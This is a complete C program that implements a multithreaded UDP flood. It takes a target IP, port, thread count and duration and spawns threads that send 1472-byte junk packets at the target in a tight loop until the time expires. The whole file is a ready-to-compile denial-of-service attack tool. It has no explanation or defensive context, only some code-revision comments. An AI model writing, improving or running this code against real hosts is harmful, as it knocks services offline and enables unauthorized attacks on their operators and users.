#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h> // Removed fcntl.h
#include <errno.h>

#define PACKET_SIZE 1472
#define DEFAULT_PORT 80
#define DEFAULT_THREADS 10
#define DEFAULT_DURATION 10

typedef struct {
    struct sockaddr_in server;
    time_t end_time;
    int sock;
} ThreadArgs;

void *udp_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    char payload[PACKET_SIZE];
    memset(payload, 'A', PACKET_SIZE);

    while (time(NULL) < args->end_time) {
        ssize_t bytes_sent = sendto(args->sock, payload, PACKET_SIZE, 0, (struct sockaddr *)&args->server, sizeof(args->server));
        if (bytes_sent < 0) {
            perror("sendto failed"); // Simplified error handling
        }
    }

    close(args->sock);
    // DO NOT free(args) here!
    return NULL;
}

int main(int argc, char *argv[]) {
    char *ip_address = NULL;
    long port = DEFAULT_PORT; // Use long for strtol
    long threads = DEFAULT_THREADS; // Use long for strtol
    long duration = DEFAULT_DURATION; // Use long for strtol
    char *endptr; // For strtol error checking

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <IP> [Port] [Threads] [Time (seconds)]\n", argv[0]);
        return 1;
    }
    ip_address = argv[1];

    if (argc > 2) {
        port = strtol(argv[2], &endptr, 10); // Use strtol
        if (*endptr != '\0' || port < 0 || port > 65535) {
            fprintf(stderr, "Invalid port number. Using default: %d\n", DEFAULT_PORT);
            port = DEFAULT_PORT;
        }
    }
    if (argc > 3) {
        threads = strtol(argv[3], &endptr, 10); // Use strtol
        if (*endptr != '\0' || threads <= 0) {
            fprintf(stderr, "Invalid thread count. Using default: %d\n", DEFAULT_THREADS);
            threads = DEFAULT_THREADS;
        }
    }
    if (argc > 4) {
        duration = strtol(argv[4], &endptr, 10); // Use strtol
        if (*endptr != '\0' || duration <= 0) {
            fprintf(stderr, "Invalid duration. Using default: %d\n", DEFAULT_DURATION);
            duration = DEFAULT_DURATION;
        }
    }

    struct sockaddr_in server = {0}; // Zero-initialize server
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_address, &server.sin_addr) <= 0) {
        perror("inet_pton failed");
        return 1;
    }

    printf("Starting UDP flood on %s:%ld for %ld seconds using %ld threads.\n",
           ip_address, port, duration, threads);

    pthread_t thread_pool[threads];
    int created[threads]; // Array to track created threads
    memset(created, 0, sizeof(created)); // Initialize created array

    ThreadArgs *args_array = (ThreadArgs *)malloc(threads * sizeof(ThreadArgs));
    if (!args_array) {
        perror("malloc failed for args_array");
        return 1;
    }
    memset(args_array, 0, threads * sizeof(ThreadArgs));

    for (int i = 0; i < threads; i++) {
        ThreadArgs *args = &args_array[i];
        args->server = server;
        args->end_time = time(NULL) + duration;

        args->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (args->sock < 0) {
            perror("socket creation failed");
            continue; // Skip this thread
        }

        int sndbuf_size = 65536;
        if (setsockopt(args->sock, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size)) < 0) {
            perror("setsockopt (SO_SNDBUF) failed");
        }

        if (pthread_create(&thread_pool[i], NULL, udp_flood, args) == 0) {
            created[i] = 1; // Mark thread as created
        } else {
            perror("pthread_create failed");
            close(args->sock);
        }
    }

    // Join only the created threads
    for (int i = 0; i < threads; i++) {
        if (created[i]) {
            pthread_join(thread_pool[i], NULL);
        }
    }

    free(args_array);
    printf("UDP flood completed.\n");
    return 0;
}
